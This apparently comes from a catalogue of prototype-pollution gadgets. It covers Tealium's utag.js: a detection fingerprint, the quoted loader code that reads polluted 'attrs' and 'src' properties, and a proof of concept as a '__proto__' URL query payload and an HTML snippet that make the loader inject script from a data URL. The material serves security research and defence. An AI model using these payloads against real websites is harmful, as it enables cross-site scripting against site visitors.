## Tealium Universal Tag

URL: https://docs.tealium.com/platforms/javascript/

### JS Fingerprint
```
return (typeof utag !== 'undefined' && typeof utag.id !== 'undefined')
```

### Vulnerable code fragment
https://tags.tiqcdn.com/utag/tealium-solutions/main/prod/utag.js
```js
      AS: function(a, b, c, d) {
        utag.send[a.id] = a;
        if (typeof a.src == 'undefined') {
          a.src = utag.cfg.path + ((typeof a.name != 'undefined') ? a.name : 'utag.' + a.id + '.js')
        }
        a.src += (a.src.indexOf('?') > 0 ? '&' : '?') + 'utv=' + (a.v?a.v:utag.cfg.v);
        utag.rpt['l_' + a.id] = a.src;
        b = document;
        this.f[a.id]=0;
        if (a.load == 2) {
          b.write('<script id="utag_' + a.id + '" src="' + a.src + '"></scr' + 'ipt>')
          if(typeof a.cb!='undefined')
            a.cb();
        } else if(a.load==1 || a.load==3) {
          if (b.createElement) {
            c = 'utag_tealium-solutions.main_'+a.id;
            if (!b.getElementById(c)) {
              d = {
                src:a.src,
                id:c,
                uid:a.id,
                loc:a.loc
              }
              if(a.load == 3) {
                d.type="iframe"
              };
              if(typeof a.cb!='undefined')
                d.cb=a.cb;
              utag.ut.loader(d);
            }
          }
        }
      },
      ...
      loader: function(o, a, b, c, l) {
        a=document;
        if (o.type=="iframe") {
          b = a.createElement("iframe");
          o.attrs = o.attrs || { "height" : "1", "width" : "1", "style" : "display:none" };
          for( l in utag.loader.GV(o.attrs) ){
            b.setAttribute( l, o.attrs[l] )
          }
          b.setAttribute("src", o.src);
        }else if (o.type=="img"){
          utag.DB("Attach img: "+o.src);
          b=new Image();b.src=o.src;
          return;
        }else{
          b = a.createElement("script");b.language="javascript";b.type="text/javascript";b.async=1;b.charset="utf-8";
          for( l in utag.loader.GV(o.attrs) ){
            b[l] = o.attrs[l]
          }
          b.src = o.src;
        }

```

### PoC
```
?__proto__[attrs][src]=1&__proto__[src]=data:,alert(1)//
```

```html
<script>
  Object.prototype.attrs = {src:1}
  Object.prototype.src='data:,alert(1)//'
</script>
<script src=https://tags.tiqcdn.com/utag/tealium-solutions/main/prod/utag.js></script>
```